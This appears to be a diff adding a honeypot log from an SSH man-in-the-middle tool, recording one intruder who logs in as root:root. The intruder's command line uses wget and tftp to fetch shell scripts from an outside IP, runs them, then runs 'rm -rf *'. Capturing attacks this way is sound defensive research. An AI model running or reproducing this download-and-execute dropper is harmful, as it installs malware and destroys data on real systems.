@@ -1,0 +1,19 @@
+2020-11-18 04:06:24.565 - [Info] MITM Version: 1.26
+2020-11-18 04:06:24.569 - [Info] Auto Access Enabled: true
+2020-11-18 04:06:24.569 - [Debug] [Init] Auto Access Barrier: true
+2020-11-18 04:06:24.583 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-18 04:22:34.191 - [Debug] [Connection] Attacker connected: 194.87.138.168 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-18 04:22:35.154 - [Debug] [Auth] Attacker 194.87.138.168 trying to authenticate with "password"
+2020-11-18 04:22:35.157 - [Debug] [Auto Access] Attacker: 194.87.138.168, Threshold: 1, Attempts: 1
+2020-11-18 04:22:35.157 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-18 04:22:35.157 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2020-11-18 04:22:35.276 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-18 04:22:35.277 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-18 04:22:36.888 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-18 04:22:37.361 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /run || cd /; wget http://104.168.195.213/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 104.168.195.213 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 104.168.195.213; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
+2020-11-18 04:23:37.958 - [Debug] [Connection] Client error on ssh server
+2020-11-18 04:23:37.959 - [Debug] [Connection] Attacker closed connection
+2020-11-18 04:23:37.964 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-18 04:23:37.964 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-18 04:27:38.226 - [Info] Exiting...
+2020-11-18 04:27:38.226 - [Debug] Cleaning up...
